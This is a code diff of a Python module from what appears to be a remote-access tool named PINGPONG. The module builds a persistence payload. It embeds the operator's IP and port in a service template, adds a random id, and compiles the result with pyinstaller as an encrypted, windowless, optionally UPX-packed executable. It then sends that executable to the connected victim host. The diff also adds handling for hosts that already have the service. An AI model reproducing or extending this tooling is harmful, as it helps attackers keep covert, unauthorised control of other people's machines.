@@ -1,5 +1,5 @@
 # -*- coding:utf-8 -*-
-# @FileName  :persistence.py
+# @FileName  :persistence_service.py
 # @Time      :2023/01/12 16:37:49
 # @Author    :D0WE1L1N
 from sys import path as _envir_path
@@ -15,9 +15,22 @@ def clear_pyinstaller_tmp(name, copytodir):
     remove(f'./{name}.spec')
     copyfile(f'./dist/{name}.exe', copytodir)
     rmtree('./dist')
+def generate_random_str(randomlength=16):
+	random_str =''
+	base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
+	length =len(base_str) -1
+	for i in range(randomlength):
+		random_str +=base_str[randint(0, length)]
+	return random_str
 def run(conn, addr, my_addr):
     if app_send.App_send('PERS_APP', True, conn, addr, my_addr):
         pingpong_dir = conn.recv(1024).decode('utf8')
+        if pingpong_dir == 'HAVEIT':
+            print_warn('PINGPONG>[!]The host already has Pingpong service')
+            print_normal('PINGPONG>[*]Remove it......')
+            conn.recv(1024)
+            conn.send(b'OK')
+            print_normal('PINGPONG>[*]Done')
         if exists('./PINGPONG_script/basic_command/TEMP'):
             rmtree('./PINGPONG_script/basic_command/TEMP')
         mkdir('./PINGPONG_script/basic_command/TEMP')
@@ -32,6 +45,8 @@ def run(conn, addr, my_addr):
                 if '#WRITE_IN_LINE_FOR_IP_AND_PORT' in line:
                     write_line = count
             lines.insert(write_line, f'        self.ip, self.port = "{my_addr[0]}", {my_addr[1]}')
+            lines.insert(write_line+1, f'       _id = "{generate_random_str()}"')
+        
         pay_line = ''.join(lines)
         with open('./PINGPONG_script/basic_command/TEMP/pingpong_service.py', 'w+') as pay:
             pay.write(pay_line)
@@ -49,7 +64,7 @@ def run(conn, addr, my_addr):
             upx = ''
             
         print_normal('PINGPONG>[*]Service packing......PLEASE WAIT FOR IT')
-        system(f"pyinstaller -p {_envir_path[4]}/Lib/site-packages -F PINGPONG_script/basic_command/TEMP/pingpong_service.py {upx} --key servicekey -w --log-level CRITICAL")     
+        system(f"pyinstaller -p {_envir_path[4]}/Lib/site-packages -F PINGPONG_script/basic_command/TEMP/pingpong_service.py {upx} --key servicekey -w --log-level CRITICAL --hiddenimport win32timezone")     
         clear_pyinstaller_tmp('pingpong_service', './PINGPONG_script/basic_command/TEMP/pingpong_service.exe')
         conn.send(b'OK')
         with open('PINGPONG_script/basic_command/TEMP/pingpong_service.exe', 'rb') as f:
